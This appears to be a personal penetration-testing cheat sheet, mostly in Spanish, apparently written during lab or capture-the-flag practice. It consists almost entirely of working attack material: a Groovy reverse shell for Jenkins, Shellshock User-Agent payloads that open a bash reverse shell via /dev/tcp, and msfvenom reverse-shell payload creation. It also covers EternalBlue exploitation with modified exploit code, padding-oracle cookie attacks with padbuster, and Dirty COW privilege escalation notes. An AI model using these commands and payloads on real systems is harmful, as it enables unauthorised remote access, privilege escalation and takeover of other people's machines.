Searchsploit 
# To view the file
searchsploit -x php/webapps/41564.c

# To see the full path of the file
searchsploit -p php/webapps/41564.c


# DIRTYCOW 40839.c
para elevar privilegios, crea un usuario y pass y me conecto por ssh como root.
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs


# revsh.groovy reversershell windows en jenkins:
String host="10.10.14.6";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
nc -lnvp 8044
https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76


# Padding Oracle Attack
padbuster http://192.168.1.x/login.php D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km 8 --cookies auth=D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km --encoding 0
Donde D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km es la Cookie de sesión y 8 el número de bloques. A pesar de no saber la cifra con exactitud, podemos montarnos un simple bucle for i in $(seq 1 100) a fin de determinar el número de bloques, pues en caso de no ser correcto no se podrá aplicar la inyección.


# shellsock 
nmap 192.168.0.102 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/status
curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ipLocal/puertoLocal 0>&1" "https://192.168.1.X:10000/cgi-bin/recurso.cgi" 
Si todo sale bien y es vulnerable a la explotación de dicha vulnerabilidad, deberemos ganar acceso al sistema desde nuestra sesión de escucha.
Otra opción es desde Burpsuite también, manipulamos el User-Agent para que figure el siguiente contenido:
User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/ip/puerto 0>&1

# bluekeep
https://github.com/robertdavidgraham/rdpscan
nmap -sV -p 3389 192.168.100.84

# eternalblue
nmap -p 445 <target> --script=smb-double-pulsar-backdoor
nmap -p445 --script vuln <target>
use exploit/windows/smb/ms17_010_eternalblue
msf exploit(ms17_010_eternalblue) > set rhost 192.168.1.101
msf exploit(ms17_010_eternalblue) > exploit
https://github.com/mez-0/MS17-010-Python/blob/master/zzz_exploit.py

https://github.com/helviojunior/MS17-010:
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f exe > eternalblue.exe
nc -nlvp 4444
python send_and_execute.py 10.10.10.4 ~/Desktop/eternalblue.exe
--------------------------------------------------------------

Otro eternalblue:
Exploits
	42315.py
	mysmb.py: tiene que estar en el mismo directorio   https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py
Creación del paylaod
	msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.21 LPORT=4444 > blue.exe
Modificar el exploit 42315.py
	USERNAME = 'guest'
	PASSWORD = ''
y también modificar esto y dejarlo así:
	smb_send_file(smbConn, '/home/n0ipr0cs/blue.exe', 'C', '/blue.exe')
	service_exec(conn, r'cmd /c c:\blue.exe')
Eso de arriba es la ruta donde esta el mi PC el blue.exe que genere antes.
Ejecutar
	sudo python 42315.py 10.10.10.40
	sudo nc -nlvp 4444


# netapi
nmap --script smb-vuln-ms08-067.nse -p445 <host>
nmap -sU --script smb-vuln-ms08-067.nse -p U:137 <host>

# memodipper
Kernels: 2.6.39, 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0
